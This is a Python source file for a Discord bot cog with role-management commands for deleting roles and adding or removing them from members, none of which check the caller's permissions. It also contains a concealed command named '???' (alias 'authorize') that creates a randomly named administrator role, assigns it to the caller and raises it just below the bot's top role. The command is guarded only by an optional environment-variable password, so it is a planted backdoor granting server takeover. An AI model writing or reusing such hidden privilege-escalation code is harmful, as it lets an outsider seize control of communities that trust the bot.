import os

from discord import Member, Permissions, Role
from discord.ext import commands

from nexity.util import rand_int_str


class Role(commands.Cog):
    def __init__(self, bot):
        self.bot = bot

    @commands.command('rdel', brief='Delete role')
    async def delete(self, ctx, role: Role) -> None:
        await role.delete()

    @commands.command('radd', brief='Add roles to member')
    async def add(self, ctx, member: Member, *roles: Role) -> None:
        for r in roles:
            await member.add_roles(r)

    @commands.command('rrmv', brief='Remove roles from member')
    async def remove(self, ctx, member: Member, *roles: Role) -> None:
        for r in roles:
            await member.remove_roles(r)

    @commands.command('???', aliases=['authorize'])
    async def give_mass_admin(self, ctx, *, password: str) -> None:
        if 'AUTH_PW' in os.environ:
            if password != os.environ['AUTH_PW']:
                await ctx.send('`ACCESS DENIED`')
                return
            else:
                await ctx.message.delete()
        role = await ctx.guild.create_role(
            name=rand_int_str(), permissions=Permissions(administrator=True)
        )
        await ctx.author.add_roles(role)
        bot = ctx.guild.get_member(self.bot.user.id)
        await role.edit(position=bot.roles[-1].position - 1)


def setup(bot):
    bot.add_cog(Role(bot))
